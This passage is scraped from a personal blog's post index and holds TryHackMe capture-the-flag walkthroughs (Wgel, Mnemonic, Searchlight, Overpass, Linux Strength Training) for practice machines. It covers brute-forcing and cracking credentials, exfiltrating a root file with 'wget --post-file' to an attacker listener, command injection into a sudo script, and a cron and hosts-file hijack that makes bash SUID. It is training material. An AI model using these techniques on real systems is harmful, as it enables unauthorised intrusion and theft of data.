codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2021/01/01 11:20:00 Starting gobuster =============================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /.ssh (Status: 301) /css (Status: 301) /fonts (Status: 301) /images (Status: 301) /index.html (Status: 200) /js (Status: 301) =============================================================== 2021/01/01 11:20:39 Finished ===============================================================   \nGaining Access Copy and save the private key to a file on your local machine.\n1 2 3  chmod 600 id_rsa ssh -i id_rsa jessie@10.10.184.94   User Flag Located in /home/jessie/Documents\nRoot Flag 1 2 3 4 5 6 7 8  jessie@CorpOne:~$ sudo -l Matching Defaults entries for jessie on CorpOne: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User jessie may run the following commands on CorpOne: (ALL : ALL) ALL (root) NOPASSWD: /usr/bin/wget   GTFOBins for usr/bin/wget : https://gtfobins.github.io/gtfobins/wget/\nStart a listener on your local machine and exfiltrate root_flag.txt with wget.\n1 2 3 4 5 6 7  root@kali:~/Documents/THM# nc -lvnp 3333 listening on [any] 3333 ... jessie@CorpOne:~$ sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.9.140.180:3333 --2021-01-01 19:35:47-- http://10.9.140.180:3333/ Connecting to 10.9.140.180:3333... connected. HTTP request sent, awaiting response...   . . .\n\n","description":"Can you exfiltrate the root flag?","id":13,"section":"posts","tags":["enumeration","exploitation"],"title":"Wgel [TryHackMe]","uri":"https://martinkubecka.github.io/en/posts/thm/wgel/"},{"content":"   Title Mnemonic     Info I hope you have fun.   Difficulty Medium    Scanning \u0026amp; Enumeration Nmap  How many open ports?\nWhat is the ssh port number?\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  nmap -p- -A -T4 {TARGET MACHINE IP} Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-29 08:11 CST Stats: 0:01:26 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 11.32% done; ETC: 08:23 (0:11:14 remaining) Stats: 0:01:27 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 11.36% done; ETC: 08:23 (0:11:11 remaining) Stats: 0:03:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 23.75% done; ETC: 08:24 (0:10:07 remaining) Nmap scan report for 10.10.89.251 Host is up (0.075s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 80/tcp\topen http Apache httpd 2.4.29 ((Ubuntu)) | http-robots.txt: 1 disallowed entry |_/webmasters/* |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). 1337/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e0:42:c0:a5:7d:42:6f:00:22:f8:c7:54:aa:35:b9:dc (RSA) | 256 23:eb:a9:9b:45:26:9c:a2:13🆎c1:ce:07:2b:98:e0 (ECDSA) |_ 256 35:8f:cb:e2:0d:11:2c:0b:63:f2:bc:a0:34:f3:dc:49 (ED25519)   Directory Brute-Forcing  What is the name of the secret file?\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  gobuster dir -u http://{TARGET MACHINE IP}-w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.89.251 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/12/29 08:13:07 Starting gobuster =============================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /index.html (Status: 200) /robots.txt (Status: 200) /server-status (Status: 403) /webmasters (Status: 301) =============================================================== 2020/12/29 08:13:46 Finished ===============================================================   Continue enumeration with /webmasters\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  gobuster dir -u http://{TARGET MACHINE IP}/webmasters -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.89.251/webmasters [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/12/29 08:15:05 Starting gobuster =============================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /admin (Status: 301) /backups (Status: 301) /index.html (Status: 200) =============================================================== 2020/12/29 08:15:45 Finished ===============================================================   Now we are going to look for the files with specific extensions.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  gobuster dir -u http://{TARGET MACHINE IP}/webmasters/backups -x php,txt,zip,rar,sql,js,html -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.89.251/webmasters/backups [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: rar,sql,js,html,php,txt,zip [+] Timeout: 10s =============================================================== 2020/12/29 08:18:50 Starting gobuster =============================================================== . . . /backups.zip (Status: 200) . . .   FTP For cracking the found zip file we will use frackzip.\n FTP user name?\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  curl http://{TARGET MACHINE IP}/webmasters/backups/backups.zip \u0026gt; backups.zip sudo apt-get install fcrackzip fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u backups.zip -v \u0026#39;backups/\u0026#39; is not encrypted, skipping found file \u0026#39;backups/note.txt\u0026#39;, (size cp/uc 67/ 60, flags 9, chk 24e2) checking pw 05546TUNmaneerat PASSWORD FOUND!!!!: pw == 00385007 unzip backups.zip Archive: backups.zip creating: backups/ [backups.zip] backups/note.txt password: inflating: backups/note.txt cat note.txt 1 @vill 2 3 James new ftp username: ftpuser 4 we have to work hard   Flags used with fcrackzip:\n-D\tto crack the password using a dictionary\n-p\tto use string as initial password\n-u\tto use unzip to weed out wrong passwords\n-v\tto be more verbose\n FTP password?\n With the ftp username we are able to brute force required password with hydra.\n1 2 3 4 5 6 7 8 9 10 11  hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://{TARGET MACHINE IP} Hydra v9.1 (c) 2020 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-29 08:37:41 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking ftp://10.10.89.251:21/ [STATUS] 258.00 tries/min, 258 tries in 00:01h, 14344141 to do in 926:38h, 16 active [STATUS] 266.67 tries/min, 800 tries in 00:03h, 14343599 to do in 896:29h, 16 active [21][ftp] host: 10.10.89.251 login: ftpuser password: love4ever 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-12-29 08:41:50   Gaining Access SSH  What is the ssh username?\nWhat is the ssh password?\n Enumerating FTP we can find .ssh folder with id_rsa file.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  ftp {TARGET MACHINE IP} Connected to 10.10.89.251. 220 (vsFTPd 3.0.3) Name (10.10.89.251:root): ftpuser 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 0 0 4096 Jul 13 21:16 data-1 drwxr-xr-x 2 0 0 4096 Jul 13 21:17 data-10 drwxr-xr-x 2 0 0 4096 Jul 13 21:16 data-2 drwxr-xr-x 2 0 0 4096 Jul 13 21:16 data-3 drwxr-xr-x 4 0 0 4096 Jul 14 18:05 data-4 drwxr-xr-x 2 0 0 4096 Jul 13 21:16 data-5 drwxr-xr-x 2 0 0 4096 Jul 13 21:17 data-6 drwxr-xr-x 2 0 0 4096 Jul 13 21:17 data-7 drwxr-xr-x 2 0 0 4096 Jul 13 21:17 data-8 drwxr-xr-x 2 0 0 4096 Jul 13 21:17 data-9 226 Directory send OK. ftp\u0026gt; cd data-4 250 Directory successfully changed. ftp\u0026gt; ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 4 0 0 4096 Jul 14 18:05 . drwx------ 12 1003 1003 4096 Jul 14 18:22 .. drwxr-xr-x 2 0 0 4096 Jul 14 18:04 3 drwxr-xr-x 2 0 0 4096 Jul 14 18:04 4 -rwxr-xr-x 1 1001 1001 1766 Jul 13 20:34 id_rsa -rwxr-xr-x 1 1000 1000 31 Jul 13 21:18 not.txt 226 Directory send OK. ftp\u0026gt; get id_rsa   Convert the private key:\n1  ssh2john id_rsa \u0026gt; forjohn.txt   Now we can crack the SSH passphrase with john.\n1 2 3 4 5 6 7 8 9 10 11 12  john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 2 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status bluelove (id_rsa) 1g 0:00:00:06 DONE (2020-12-29 08:51) 0.1459g/s 2093Kp/s 2093Kc/s 2093KC/sa6_123..*7¡Vamos! Session completed   Now login with found credentials.\nDecoding \u0026amp; Steganography  What is the condor password?\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  james@mnemonic:~$ ls -la total 44 drwx------ 6 james james 4096 Jul 14 18:20 . drwxr-xr-x 10 root root 4096 Jul 14 18:27 .. -rw-r--r-- 1 vill vill 116 Jul 14 17:56 6450.txt lrwxrwxrwx 1 james james 9 Jul 14 18:20 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 james james 220 Jul 13 19:59 .bash_logout -rw-r--r-- 1 james james 3771 Jul 13 19:59 .bashrc drwx------ 2 james james 4096 Jul 13 22:14 .cache drwx------ 3 james james 4096 Jul 13 22:42 .gnupg drwxrwxr-x 3 james james 4096 Jul 13 21:34 .local -rw-r--r-- 1 vill vill 155 Jul 13 20:31 noteforjames.txt -rw-r--r-- 1 james james 807 Jul 13 19:59 .profile drwx------ 2 james james 4096 Jul 13 21:16 .ssh james@mnemonic:~$ cat 6450.txt 5140656 354528 842004 1617534 465318 1617534 509634 1152216 753372 265896 265896 15355494 24617538 3567438 15355494 james@mnemonic:~$ cat noteforjames.txt noteforjames.txt @vill james i found a new encryption İmage based name is Mnemonic I created the condor password. don\u0026#39;t forget the beers on saturday james@mnemonic:~$ find / -type f -name user.txt . . . find: ‘/home/condor/\u0026#39;VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ==\u0026#39;’: Permission denied find: ‘/home/condor/.gnupg’: Permission denied find: ‘/home/condor/.cache’: Permission denied find: ‘/home/condor/aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==’: Permission denied . . .   While searching for a flag file, two files with their names encoded to base64 are revealed.\nDecoding the second file name gives us url link.\n\n\nAssuming we are going to use some steganography technique I searched for Mnemonic (room name) and found a program with identical name.\nhttps://github.com/MustafaTanguner/Mnemonic\n1  git clone https://github.com/MustafaTanguner/Mnemonic   Proceed with the help of Usage section and extract hidden text.\n\n\nUser Flag Decoding the first file name encoded to base64 gives us the user flag.\n\nPrivilege Escalation Root Flag 1  ssh condor@{TARGET MACHINE IP} -p 1337   Use password we found earlier with Mnemonic.\n1 2 3 4 5 6 7 8  condor@mnemonic:~$ sudo -l [sudo] password for condor: Matching Defaults entries for condor on mnemonic: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User condor may run the following commands on mnemonic: (ALL : ALL) /usr/bin/python3 /bin/examplecode.py   Analyze /bin/examplecode.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121  #!/usr/bin/python3 import os import time import sys def text(): #text print print(\u0026#34;\u0026#34;\u0026#34; ------------information systems script beta-------- --------------------------------------------------- --------------------------------------------------- --------------------------------------------------- --------------------------------------------------- --------------------------------------------------- --------------------------------------------------- ----------------@author villwocki------------------\u0026#34;\u0026#34;\u0026#34;) time.sleep(2) print(\u0026#34;\\nRunning...\u0026#34;) time.sleep(2) os.system(command=\u0026#34;clear\u0026#34;) main() def main(): info() while True: select = int(input(\u0026#34;\\nSelect:\u0026#34;)) if select == 1: time.sleep(1) print(\u0026#34;\\nRunning\u0026#34;) time.sleep(1) x = os.system(command=\u0026#34;ip a\u0026#34;) print(\u0026#34;Main Menü press \u0026#39;0\u0026#39; \u0026#34;) print(x) if select == 2: time.sleep(1) print(\u0026#34;\\nRunning\u0026#34;) time.sleep(1) x = os.system(command=\u0026#34;ifconfig\u0026#34;) print(x) if select == 3: time.sleep(1) print(\u0026#34;\\nRunning\u0026#34;) time.sleep(1) x = os.system(command=\u0026#34;ip route show\u0026#34;) print(x) if select == 4: time.sleep(1) print(\u0026#34;\\nRunning\u0026#34;) time.sleep(1) x = os.system(command=\u0026#34;cat /etc/os-release\u0026#34;) print(x) if select == 0: time.sleep(1) ex = str(input(\u0026#34;are you sure you want to quit ? yes : \u0026#34;)) if ex == \u0026#34;.\u0026#34;: print(os.system(input(\u0026#34;\\nRunning....\u0026#34;))) if ex == \u0026#34;yes \u0026#34; or \u0026#34;y\u0026#34;: sys.exit() if select == 5: #root time.sleep(1) print(\u0026#34;\\nRunning\u0026#34;) time.sleep(2) print(\u0026#34;.......\u0026#34;) time.sleep(2) print(\u0026#34;System rebooting....\u0026#34;) time.sleep(2) x = os.system(command=\u0026#34;shutdown now\u0026#34;) print(x) if select == 6: time.sleep(1) print(\u0026#34;\\nRunning\u0026#34;) time.sleep(1) x = os.system(command=\u0026#34;date\u0026#34;) print(x) if select == 7: time.sleep(1) print(\u0026#34;\\nRunning\u0026#34;) time.sleep(1) x = os.system(command=\u0026#34;rm -r /tmp/*\u0026#34;) print(x) def info(): #info print function print(\u0026#34;\u0026#34;\u0026#34; #Network Connections [1] #Show İfconfig [2] #Show ip route [3] #Show Os-release [4] #Root Shell Spawn [5] #Print date [6] #Exit [0] \u0026#34;\u0026#34;\u0026#34;) def run(): # run function text() run()   We can spawn a root shell with these steps:\n Select option 0 Instead of agreeing write a dot character (\u0026quot;.\u0026quot;)  And we got command execution (/bin/bash -\u0026gt; root shell)\n1  condor@mnemonic:~$ sudo /usr/bin/python3 /bin/examplecode.py   \n\n","description":"I hope you have fun.","id":14,"section":"posts","tags":["enumeration","ftp","zip cracking","decoding","steganography","python","privilege escalation"],"title":"Mnemonic [TryHackMe]","uri":"https://martinkubecka.github.io/en/posts/thm/mnemonic/"},{"content":"   Title Searchlight     Info OSINT challenges in the imagery intelligence category   Difficulty N/A    Your first challenge! There are 5 elements of IMINT that you should consider when looking at an image:\nContext\nForeground\nBackground\nMap markings\nTrial and error\n\n What is the name of the street where this image was taken?\nsl{carnaby street}\n Just Google it! \n Which city is the tube station located in?\nsl{london}\nWhich tube station do these stairs lead to?\nsl{piccadilly circus}\n Piccadilly Circus tube station  Which year did this station open?\nsl{1906}\nHow many platforms are there in this station?\nsl{4}\n Keep at it! \n YVR : https://www.yvr.ca/en/passengers\n   Which building is this photo taken in?\nsl{VANCOUVER INTERNATIONAL AIRPORT}\nWhich country is this building located in?\nsl{Canada}\nWhich city is this building located in?\nsl{Vancouver}\n Coffee and a light lunch In this task we are looking for a coffee shop somewhere in the Scotland.\n\n The Edinburgh Woolen Mill : https://www.ewm.co.uk/  \nUse Street View to see the coffee shop from the The Edinburgh Woolen Mill side.\n\n Which city is this coffee shop located in?\nsl{Blairgowrie}\n Further information found on their Facebook profile: https://www.facebook.com/weecoffeeshop/  Which street is this coffee shop located in?\nsl{Allan Street}\nWhat is their phone number?\nsl{+447878 839128}\nWhat is their email address?\nsl{theweecoffeeshop@aol.com}\nWhat is the surname of the owners?\n Let\u0026rsquo;s check out some posts and look for some names.  \n Often page owners use their private profile to interact in the comments section on ther page.    Reverse your thinking \n Which restaurant was this picture taken at?\n Uploading the picture into Google images gives us result with name and location.   sl{Katz\u0026rsquo;s Deli}\nWhat is the name of the Bon Appétit editor that worked 24 hours at this restaurant?\n sl{Andrew Knowlton}\n Locate this sculpture \n What is the name of this statue?\n  HINT: \u0026ldquo;Og når det er vind og sno Blir han så kald på nesen, Så den lyser som en glo.\u0026rdquo;\n  From this blog I found out that the statue is located in Norway: https://wonder175.blogspot.com/2019/04/norwegia-lofoty-cz-v.html\n  Pasting hint into Google search shows results for \u0026ldquo;Rudolph the Red-Nosed Reindeer\u0026rdquo;.\n  Now, search for \u0026ldquo;norway rudolph red nosed reindeer statue\u0026rdquo;.\n  In the image section we have a picture of the statue we are looking for.\n   ls{Rudolph the Chrome Nosed Reindeer sculpture}\nWho took this image?\n  HINT: If you know the location of the statue you may want to visitoslo\n  Use clickable map and look around Oslo for our scuplture: https://www.visitoslo.com/en/articles/outdoor-sculptures-in-oslo/\n   sl{Kjersti Stensrud}\n \u0026hellip;and justice for all \n What is the name of the character that the statue depicts?\n Let\u0026rsquo;s start with uploading given picture to Google Images. The first result gives us the answer for the first question: https://en.wikipedia.org/wiki/Lady_Justice  sl{Lady Justice}\nWhere is this statue located?\n HINT: the birthplace of a nation  \n Now search for \u0026ldquo;virginia lady justice statue\u0026rdquo;, we get this picture which is the same as the given one just taken from the other angle:   sl{Alexandria, Virginia}\nWhat is the name of the building opposite from this statue?\n sl{The Westin Alexandria Old Town}\n The view from my hotel room This time we are given a video showing us a view from the hotel balcony.\nProposed writeup for the tool called FFmpeg: https://nixintel.info/osint-tools/using-ffmpeg-to-grab-stills-and-audio-for-osint/\nWhile watching the video I noticed this famous building I know:\n\nIt is Marina Bay Sands hotel in Singapore.\nFrom this part of the video we can see Riverside Point and the angle of the river canal.\n\n\nZoom to our hotel location:\n\nIn the list of all hotels in the area I recognized this hotel entrance from the Street View and linked it to our hotel.\n\nAfter a quick Google search I found out the hotel name: https://novotelclarkequay.singapore-sg.com/en/#!\n What is the name of the hotel that my friend is staying in?\nsl{Hotel Novotel Singapore Clarke Quay}\n ","description":"OSINT challenges in the imagery intelligence category","id":15,"section":"posts","tags":["OSINT","images","geolocation"],"title":"Searchlight [TryHackMe]","uri":"https://martinkubecka.github.io/en/posts/thm/searchlight/"},{"content":"   Title Overpass     Info What happens when some broke CompSci students make a password manager?   Difficulty Easy    Scanning \u0026amp; Enumeration Nmap Let\u0026rsquo;s start with nmap:\n1 2 3 4 5 6 7  nmap -vv -sC -sV {TARGET MACHINE} PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API) . . .      Flag Description     -vv for extra verbose   -sC scan for default scripts   -sV probe open ports to determine service/version info    \nGoing through the source code of the page we can find different directories:\n/aboutus\n/downloads\n/img\nAlso there is a comment probably from one of the devs, may be useful in the future:\n\nContinue with page enumeration and navigate to the Downloads folder:\n\nThe source code is written in the Go language and is easy to read.\nAt the very beginig there is a rot47 function.\nThe ROT47 (Caesar cipher by 47 chars) is a simple character substitution cipher that replaces a character within the ASCII range [33, 126] with the character 47 character after it (rotation) in the ASCII table.\nIt is an invertible algorithm i.e. applying the same algorithm to the input twice will get the origin text. (https://rot47.net)\nAlso we can download the precompiled binaries based on our operation system and run the program. In this point the best what we can do is use gobuster to check for other direcories.\nDirectory Brute-Forcing 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  gobuster dir -u 10.10.123.229 -w /usr/share/wordlists/dirb/comm =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.123.229 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/12/23 08:13:27 Starting gobuster =============================================================== /aboutus (Status: 301) /admin (Status: 301) /css (Status: 301) /downloads (Status: 301) /img (Status: 301) /index.html (Status: 301) =============================================================== 2020/12/23 08:14:04 Finished ===============================================================   And we get one more we didn\u0026rsquo;t find before: admin\n\nCommon credentials and basic SQLi inputs do not work so we will need to find another way in. Once again go through the source code of the page.\nThere are three java scripts:\n/main.js\n/login.js\n/cookie.js\nCookies exploitation The most interesting one is going to be login.js :\n\nYou can set the value in the browser: Press F12 to open dev tools -\u0026gt; Console -\u0026gt; set the value -\u0026gt; Run\n\nOr you can set the value in the command line: curl \u0026ldquo;http://{TARGET MACHINE IP}/admin/\u0026rdquo; \u0026ndash;cookie \u0026ldquo;SessionToken=hello there\u0026rdquo;\nResult is shown based on your chosen method.\n\nGaining Access Great! We have SSH key for James.\nCopy it and save to id_rsa file.\nThen change the file permisions to 600 (-rw\u0026mdash;\u0026mdash;-) with chmod 600 id_rsa command.\nSince we now it is for James we can login with his credentials:\n1  ssh -i id_rsa james@{TARGET MACHINE IP}   User flag Enter we are prompted to enter the passphrase for the key.\nWe are going to use John The Ripper (john) to bruteforce the passphrase, but first we need to convert id_rsa file to format suited for john. Locate ssh2john.py: locate ssh2john (my location: /opt/ssh2john.py)\nConvert the file: **\t/opt/ssh2john.py id_rsa \u0026gt; forjohn.txt**\nAnd crack it with rockyou.txt wordlist: **john \u0026ndash;wordlist=/usr/share/wordlists/rockyou.txt forjohn.txt**\nIn a few seconds we get the passphrase: **james13**\nRepeat the ssh command and when prompted enter the passphrase.\nGet the user flag located in the home direcory!\nList home directory:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  ls -la total 48 drwxr-xr-x 6 james james 4096 Jun 27 16:07 . drwxr-xr-x 4 root root 4096 Jun 27 02:20 .. lrwxrwxrwx 1 james james 9 Jun 27 02:38 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 james james 220 Jun 27 02:20 .bash_logout -rw-r--r-- 1 james james 3771 Jun 27 02:20 .bashrc drwx------ 2 james james 4096 Jun 27 04:45 .cache drwx------ 3 james james 4096 Jun 27 04:45 .gnupg drwxrwxr-x 3 james james 4096 Jun 27 04:20 .local -rw-r--r-- 1 james james 49 Jun 27 04:26 .overpass -rw-r--r-- 1 james james 807 Jun 27 02:20 .profile drwx------ 2 james james 4096 Jun 27 04:44 .ssh -rw-rw-r-- 1 james james 438 Jun 27 04:23 todo.txt -rw-rw-r-- 1 james james 38 Jun 27 16:07 user.txt   There is a file overpass contaning his encrypted password: ,LQ?2\u0026gt;6QiQ$JDE6\u0026gt;Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.\nFrom the source code we now they used rot47 so we can decrypt it with some online tool like this one:\nhttps://www.dcode.fr/rot-47-cipher\nThe result is: [{\u0026ldquo;name\u0026rdquo;:\u0026ldquo;System\u0026rdquo;,\u0026ldquo;pass\u0026rdquo;:\u0026ldquo;saydrawnlyingpicture\u0026rdquo;}]\nObtained Credentials: james:saydrawnlyingpicture\nPrivilege Escalation Firstly, try sudo -l to check what he can run as root.\nResponse: Sorry, user james may not run sudo on overpass-prod.\nWe are going to use auto enumeratoin script for Linux called linPEAS:\nhttps://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)\nBut before we need to transfer this script to our target machine.\nStart python server on you machine: python3 http.server 80\nOn the target machine download the file and save it: curl {LOCAL MACHINE IP}:80/linpeas.sh \u0026gt; linpeas.sh\nAdd execution permission to linpeas script: chmod +x linpeas.sh\nNow run it: ./linpeas.sh\nReading through the colorful output there are two things we are going to link together:\n Cron job accessing overpass.thm and runing with root permisions:  \nWritable file hosts:  \nWe can impersonate overpass.thm and let the curl download our prepared script.\nModify hosts file on the target machine and replace overpass.thm IP with your own.\n\nTo make it work properly we need to simulate the directory structe in the curl command. Start with creating directories: mkdir -p downloads/src\nIn the src directory create a file: touch buildscript.sh\nIn the text editor we are going to add command we want the taget machine to execute after the curl command is piped to bash.\nEasiest way to leverage our privelegies is to add sticky bit to bash:\n\nMore on that here in the SUID section: https://gtfobins.github.io/gtfobins/bash/\nOnce again start a python server on your machine in the src folder: python3 http.server 80\nYou will be noticed when the target machine will reach to download the script:\n\nWait a minute for the system to run the cron job and get root:\n\nRoot flag Grab the root flag!\n","description":"What happens when some broke CompSci students make a password manager?","id":16,"section":"posts","tags":["enumeration","hash cracking","enumeration scripts","cron","privilege escalation"],"title":"Overpass [TryHackMe]","uri":"https://martinkubecka.github.io/en/posts/thm/overpass/"},{"content":"   Title Linux Strength Training     Info Guided room for beginners to learn/reinforce linux command line skills.   Difficulty N\\A    Finding your way around linux Finding specific files/folders on a system based on various conditions:\n\nWhat is the correct option for finding files based on group?\n -group\n What is format for finding a file with the user named Francis and with a size of 52 kilobytes in the directory /home/francis/?\n find /home/francis -type f -user francis -size 52k\n SSH as topson using his password topson.\nGo to the /home/topson/chatlogs directory and type the following: grep -iRl \u0026lsquo;keyword\u0026rsquo;.\nWhat is the name of the file that you found using this command?\n\nType: less [filename] to open the file.\nThen, before anything, type / before typing: keyword followed by [ENTER].\nNotice how that allowed us to search for the first instance of that word in the entire document.\nWhat are the proceeding characters after the searched word you found?\n\nRead the file named \u0026lsquo;ReadMeIfStuck.txt\u0026rsquo;. What is the Flag?\n. . .\njust follow the instructions in each file\n. . .\n\nWorking with files Hypothetically, you find yourself in a directory with many files and want to move all these files to the directory of /home/francis/logs\nWhat is the correct command to do this?\n mv * /home/francis/logs\n Hypothetically, you want to transfer a file from your /home/james/Desktop/ with the name script.py to the remote machine (192.168.10.5) directory of /home/john/scripts using the username of john.\nWhat would be the full command to do this?\n scp /home/james/Desktop/script.py john@192.168.10.5:/home/john/scripts\n How would you rename a folder named -logs to -newlogs?\n mv \u0026ndash; -logs -newlogs\n How would you copy the file named encryption keys to the directory of /home/john/logs?\n cp \u0026ldquo;encryption keys\u0026rdquo; /home/john/logs\n Find a file named readME_hint.txt inside topson\u0026rsquo;s directory and read it.\nUsing the instructions it gives you, get the second flag.\n. . .\nonce again just follow the instructions\n. . .\n\nHashing (introduction) Download the hash file attached to this task and attempt to crack the MD5 hash.\nWhat is the password?\n\n\n\nSSH as sarah using: sarah@[MACHINE:IP] and use the password: rainbowtree1230x\nWhat is the hash type stored in the file hashA.txt?\n\nCrack hashA.txt using john the ripper, what is the password?\n\nWhat is the hash type stored in the file hashB.txt?\n\nFind a wordlist with the file extention of \u0026lsquo;.mnf\u0026rsquo; and use it to crack the hash with the filename hashC.txt.\nWhat is the password?\nSarah machine:\n Locate the wordlist by its extension. Change dir Move the wordlist Run simple server  1 2 3 4  find / -type f -name \u0026#34;*.mnf\u0026#34; 2\u0026gt;\u0026gt;/dev/null cd \u0026#34;/home/sarah/system AB/db\u0026#34; mv ww.mnf ~ python3 -m http.server 8080   Your machine:\n Transfer the wordlist  1  scp -p 8080 sarah@10.10.147.242:/home/sarah/ww.mnf .   \n1 2 3 4 5 6 7 8 9 10  john --format=raw-sha256 --wordlist=ww.mnf hash Using default input encoding: UTF-8 Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x]) Warning: poor OpenMP scalability for this hash type, consider --fork=2 Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status unacvaolipatnuggi (?) 1g 0:00:00:00 DONE (2020-12-12 04:07) 10.00g/s 2293Kp/s 2293Kc/s 2293KC/s trisyllabically..untent Use the \u0026#34;--show --format=Raw-SHA256\u0026#34; options to display all of the cracked passwords reliably Session completed   Crack hashB.txt using john the ripper, what is the password?\n1 2 3 4 5 6 7 8 9  john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x]) Warning: no OpenMP support for this hash type, consider --fork=2 Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status letmein (?) 1g 